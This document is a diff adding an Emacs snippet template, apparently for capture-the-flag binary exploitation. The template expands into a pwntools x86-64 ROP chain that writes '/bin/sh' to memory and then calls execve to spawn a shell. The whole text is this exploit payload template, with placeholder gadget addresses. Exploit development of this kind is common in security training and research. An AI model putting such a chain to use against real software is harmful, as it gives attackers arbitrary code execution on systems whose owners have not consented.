@@ -1,0 +1,23 @@
+# -*- mode: snippet -*-
+# name: rop64
+# key: rop64
+# condition: t
+# --
+rop = flat(
+    # Write /bin/sh to bss section
+    p64(pop_rdx), p64(binsh_addr),
+    p64(pop_rax), p64(0x68732f6e69622f),
+    p64(write_mem),
+
+    # Set syscall arguments
+    # file: /bin/sh
+    p64(pop_rdi), p64(binsh_addr),
+    # argv: 0
+    p64(pop_rsi), p64(0),
+    # envp: 0
+    p64(pop_rdx), p64(0),
+
+    # execve("/bin/sh", 0, 0)
+    p64(pop_rax), p64(0x3b),
+    p64(syscall)
+)
